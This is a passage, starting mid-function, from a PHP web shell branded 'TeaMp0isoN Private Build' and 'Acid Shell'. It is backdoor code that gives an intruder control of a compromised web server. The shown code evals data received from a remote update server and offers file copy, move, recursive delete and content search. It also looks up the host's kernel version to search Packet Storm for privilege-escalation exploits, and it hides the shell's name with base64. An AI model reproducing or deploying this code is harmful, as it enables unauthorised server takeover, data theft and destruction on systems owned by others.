      }
      else {return "New version are available: ".$string[1];}
    }
    elseif ($data{0} == "\x99" and $data{1} == "\x04") {
      eval($string);
      return 1;
    }
    else {return "Error in protocol: segmentation failed! (".$data.") ";}
  }
}
function tp_buff_prepare() {
  global $sess_data;
  global $act;
  foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
  foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
  $sess_data["copy"] = array_unique($sess_data["copy"]);
  $sess_data["cut"] = array_unique($sess_data["cut"]);
  sort($sess_data["copy"]);
  sort($sess_data["cut"]);
  if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
  else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
function tp_sess_put($data) {
  global $sess_cookie;
  global $sess_data;
  tp_buff_prepare();
  $sess_data = $data;
  $data = serialize($data);
  setcookie($sess_cookie,$data);
}


function fs_copy_dir($d,$t) {
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $h = opendir($d);
  while (($o = readdir($h)) !== FALSE) {
    if (($o != ".") and ($o != "..")) {
      if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
      else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
      if (!$ret) {return $ret;}
    }
  }
  closedir($h);
  return TRUE;
}
function fs_copy_obj($d,$t) {
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
  if (!is_dir(dirname($t))) {mkdir(dirname($t));}
  if (is_dir($d)) {
    if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
    if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
    return fs_copy_dir($d,$t);
  }
  elseif (is_file($d)) { return copy($d,$t); }
  else { return FALSE; }
}
function fs_move_dir($d,$t) {
  $h = opendir($d);
  if (!is_dir($t)) {mkdir($t);}
  while (($o = readdir($h)) !== FALSE) {
    if (($o != ".") and ($o != "..")) {
      $ret = TRUE;
      if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
      else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
      if (!$ret) {return $ret;}
     }
   }
  closedir($h);
  return TRUE;
}
function fs_move_obj($d,$t) {
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
  if (is_dir($d)) {
    if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
    if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
    return fs_move_dir($d,$t);
  }
  elseif (is_file($d)) {
    if(copy($d,$t)) {return unlink($d);}
    else {unlink($t); return FALSE;}
  }
  else {return FALSE;}
}
function fs_rmdir($d) {
  $h = opendir($d);
  while (($o = readdir($h)) !== FALSE) {
    if (($o != ".") and ($o != "..")) {
      if (!is_dir($d.$o)) {unlink($d.$o);}
      else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
    }
  }
  closedir($h);
  rmdir($d);
  return !is_dir($d);
}
function fs_rmobj($o) {
  $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
  if (is_dir($o)) {
    if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
    return fs_rmdir($o);
  }
  elseif (is_file($o)) {return unlink($o);}
  else {return FALSE;}
}

function onphpshutdown() {
  global $gzipencode,$ft;
  if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) {
    $v = @ob_get_contents();
    @ob_end_clean();
    @ob_start("ob_gzHandler");
    echo $v;
    @ob_end_flush();
  }
}
function tpshexit() { onphpshutdown(); exit; }

function tpfsearch($d) {
  global $found, $found_d, $found_f, $search_i_f, $search_i_d, $a;
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $h = opendir($d);
  while (($f = readdir($h)) !== FALSE) {
    if($f != "." && $f != "..") {
      $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
      if (is_dir($d.$f)) {
        $search_i_d++;
        if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
        if (!is_link($d.$f)) {tpfsearch($d.$f);}
      }
      else {
        $search_i_f++;
        if ($bool) {
          if (!empty($a["text"])) {
            $r = @file_get_contents($d.$f);
            if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
            if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
            if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
            else {$bool = strpos(" ".$r,$a["text"],1);}
            if ($a["text_not"]) {$bool = !$bool;}
            if ($bool) {$found[] = $d.$f; $found_f++;}
          }
          else {$found[] = $d.$f; $found_f++;}
        }
      }
    }
  }
  closedir($h);
}
function view_size($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
    elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
    elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
    else {$size = $size . " B";}
    return $size;
  }
}
function tabsort($a,$b) { global $v; return strnatcmp($a[$v], $b[$v]);}
function view_perms($mode) {
  if (($mode & 0xC000) === 0xC000) {$type = "s";}
  elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
  elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
  elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
  elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
  elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
  elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
  else {$type = "?";}
  $owner["read"] = ($mode & 00400)?"r":"-";
  $owner["write"] = ($mode & 00200)?"w":"-";
  $owner["execute"] = ($mode & 00100)?"x":"-";
  $group["read"] = ($mode & 00040)?"r":"-";
  $group["write"] = ($mode & 00020)?"w":"-";
  $group["execute"] = ($mode & 00010)?"x":"-";
  $world["read"] = ($mode & 00004)?"r":"-";
  $world["write"] = ($mode & 00002)? "w":"-";
  $world["execute"] = ($mode & 00001)?"x":"-";
  if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
  if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
  if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
  return $type.join("",$owner).join("",$group).join("",$world);
}
function parse_perms($mode) {
  if (($mode & 0xC000) === 0xC000) {$t = "s";}
  elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
  elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
  elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
  elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
  elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
  elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
  else {$t = "?";}
  $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
  $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
  $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
  return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
}
function parsesort($sort) {
  $one = intval($sort);
  $second = substr($sort,-1);
  if ($second != "d") {$second = "a";}
  return array($one,$second);
}
function view_perms_color($o) {
  if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}
  elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}
  else {return "<font color=green>".view_perms(fileperms($o))."</font>";}
}
function str2mini($content,$len) {
  if (strlen($content) > $len) {
    $len = ceil($len/2) - 2;
    return substr($content, 0,$len)."...".substr($content,-$len);
  } else {return $content;}
}
function strips(&$arr,$k="") {
  if (is_array($arr)) { foreach($arr as $k=>$v) { if (strtoupper($k) != "GLOBALS") { strips($arr["$k"]); } } }
  else { $arr = stripslashes($arr); }
}

function getmicrotime() {
  list($usec, $sec) = explode(" ", microtime());
  return ((float)$usec + (float)$sec);
}

function milw0rm() {
  $Lversion = php_uname(r);
  $OSV = php_uname(s);
  if(eregi("Linux",$OSV)) {
    $Lversion = substr($Lversion,0,6);
    return "http://packetstormsecurity.org/search/?q=Linux Kernel ".$Lversion;
  } else {
    $Lversion = substr($Lversion,0,3);
    return "http://packetstormsecurity.org/search/?q=".$OSV." ".$Lversion;
  }
}

    
function sh_name() { return base64_decode("VGVhTXAwaXNvTiBQcml2YXRlIEJ1aWxkIFsgQkVUQSBd"); }
function htmlhead($safemode) {
$style = '
<style type="text/css">
body,table {font:8pt verdana;background-color:black;}
table {width:100%;}
table,td,#maininfo td {padding:3px;}
table,td,input,select,option {border:1px solid #808080;}
body,table,input,select,option {color:#FFFFFF;}
a {color:lightblue;text-decoration:none; } a:link {color:#5B5BFF;} a:hover {text-decoration:underline;} a:visited {color:#99CCFF;}
textarea {color:#dedbde;font:8pt Courier New;border:1px solid #666666;margin:2;}
#pagebar {padding:5px;border:3px solid #1E1E1E;border-collapse:collapse;}
#pagebar td {vertical-align:top;}
#pagebar,#pagebar p,.info,input,select,option {font:8pt tahoma;}
#pagebar a {font-weight:bold;color:orange;}
#pagebar a:visited {color:#000000;}
#mainmenu {text-align:center;}
#mainmenu a {text-align: center;padding: 0px 5px 0px 5px;}
#maininfo,.barheader,.bartitle {text-align:center;}
.fleft {float:left;text-align:left;}
.fright {float:right;text-align:right;}
.bartitle {padding:5px;border:2px solid #000000;}
.barheader {font-weight:bold;padding:5px;}
.info,.info td,.info th {margin:0;padding:0;border-collapse:collapse;}
.info th {color:orange;text-align:left;width:13%;}
.contents,.explorer {border-collapse:collapse;}
.contents,.explorer td,th {vertical-align:top;}
.mainpanel {border-collapse:collapse;padding:5px;}
.barheader,.mainpanel table,td {border:1px solid #333333;}
input[type="submit"],input[type="button"] {border:1px solid #000000;}
input[type="text"] {padding:3px;}
.shell {background-color:#000000;color:orange;padding:5px;font-size:12;}
.fxerrmsg {color:red; font-weight:bold;}
#pagebar,#pagebar p,h1,h2,h3,h4,form {margin:0;}
#pagebar,.mainpanel,input[type="submit"],input[type="button"] {background-color:#000000;}
.bartitle,input,select,option,input[type="submit"]:hover,input[type="button"]:hover {background-color:#333333;}
textarea,#pagebar input[type="text"],.mainpanel input[type="text"],input[type="file"],select,option {background-color:#000000;}
input[type="label"] { text-align:right;}
.info,.info td,input[type="label"] {border:0;background:none;}
</style>
';
$html_start = '
<html><head>
<title>'.getenv("HTTP_HOST").' - '.sh_name().'</title>
'.$style.'
</head>
<body>
<center><img src="http://s019.radikal.ru/i642/1301/8b/4b8d2f31486f.png" alt="ShellBanner"></center>
';
return $html_start;
};
function footer() {
  echo "<div class=bartitle colspan=2><font size=2 color=#00FF00><b> [ Acid ] Shell -  #Version 1! [PRIV4TE] -; Generated: ".round(getmicrotime()-starttime,4)." seconds</b></font></div>";
}
chdir($lastdir); tpshexit();
?>
